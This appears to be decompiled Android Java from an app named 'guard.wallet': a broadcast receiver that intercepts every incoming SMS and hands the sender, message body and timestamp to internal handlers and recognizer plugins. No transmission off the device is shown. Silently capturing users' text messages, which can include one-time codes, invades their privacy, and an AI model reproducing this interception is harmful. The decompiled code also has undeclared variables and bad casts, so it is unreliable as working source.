package com.guard.wallet.receiver;

import a1.q;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import com.guard.wallet.MainApplication;
import com.guard.wallet.req.MessageBodyVO;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.resp.SmsMessageVO;
import com.guard.wallet.resp.SmsRecognizePlug;
import java.util.LinkedList;

public class SmsReceiver extends BroadcastReceiver {
   public Integer a = 0;

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final void onReceive(Context var1, Intent var2) {
      Exception var10000;
      label122: {
         try {
            this.a = 1;
            if (!"android.provider.Telephony.SMS_RECEIVED".equals(var2.getAction()) && !"android.provider.Telephony.SMS_DELIVER".equals(var2.getAction())) {
               return;
            }
         } catch (Exception var18) {
            var10000 = var18;
            boolean var10001 = false;
            break label122;
         }

         Bundle var5;
         try {
            Log.d("SmsReceiver", "开始接收短信.....");
            var5 = var2.getExtras();
            var19 = var2.getStringExtra("format");
         } catch (Exception var17) {
            var10000 = var17;
            boolean var29 = false;
            break label122;
         }

         if (var5 == null) {
            return;
         }

         try {
            if (var5.get("pdus") == null) {
               return;
            }

            var21 = (Object[])var5.get("pdus");
         } catch (Exception var16) {
            var10000 = var16;
            boolean var30 = false;
            break label122;
         }

         if (var21 == null) {
            return;
         }

         int var4;
         try {
            if (var21.length <= 0) {
               return;
            }

            var4 = var21.length;
         } catch (Exception var15) {
            var10000 = var15;
            boolean var31 = false;
            break label122;
         }

         int var3 = 0;

         while (true) {
            if (var3 >= var4) {
               return;
            }

            Object var6 = var21[var3];

            label124: {
               label125: {
                  try {
                     var6 = (byte[])var6;
                  } catch (Exception var14) {
                     var10000 = var14;
                     boolean var32 = false;
                     break label125;
                  }

                  if (var6 == null) {
                     break label124;
                  }

                  SmsMessage var7;
                  try {
                     if (((Object[])var6).length <= 0) {
                        break label124;
                     }

                     var7 = SmsMessage.createFromPdu((byte[])var6, var19);
                  } catch (Exception var13) {
                     var10000 = var13;
                     boolean var33 = false;
                     break label125;
                  }

                  if (var7 == null) {
                     break label124;
                  }

                  try {
                     var6 = new SmsMessageVO(
                        var7.getOriginatingAddress(),
                        var7.getDisplayOriginatingAddress(),
                        var7.getMessageBody(),
                        var19,
                        String.valueOf(var7.getTimestampMillis()),
                        1
                     );
                     String var8 = var2.getAction();
                     if (!q.B(var8)) {
                        MessageRecordVO var25 = new MessageRecordVO();
                        var25.setExtraBody((MessageBodyVO)var6);
                        var25.setIntentCode(var8);
                        MainApplication.getInstance().getHandlerMsgAndTimer().b(var25);
                     }
                  } catch (Exception var12) {
                     var10000 = var12;
                     boolean var34 = false;
                     break label125;
                  }

                  try {
                     if (MainApplication.getInstance().getSmsMessageListener() == null) {
                        break label124;
                     }

                     LinkedList var26 = MainApplication.getInstance().getSmsMessageListener().a;
                     if (var26.isEmpty()) {
                        break label124;
                     }

                     var27 = var26.iterator();
                  } catch (Exception var11) {
                     var10000 = var11;
                     boolean var35 = false;
                     break label125;
                  }

                  while (true) {
                     try {
                        if (!var27.hasNext()) {
                           break label124;
                        }

                        ((SmsRecognizePlug)var27.next()).offer((SmsMessageVO)var6);
                     } catch (Exception var10) {
                        var10000 = var10;
                        boolean var36 = false;
                        break;
                     }
                  }
               }

               var6 = var10000;

               try {
                  q.s("SmsReceiver", (Exception)var6);
               } catch (Exception var9) {
                  var10000 = var9;
                  boolean var37 = false;
                  break;
               }
            }

            var3++;
         }
      }

      Exception var20 = var10000;
      q.s("SmsReceiver", var20);
   }
}
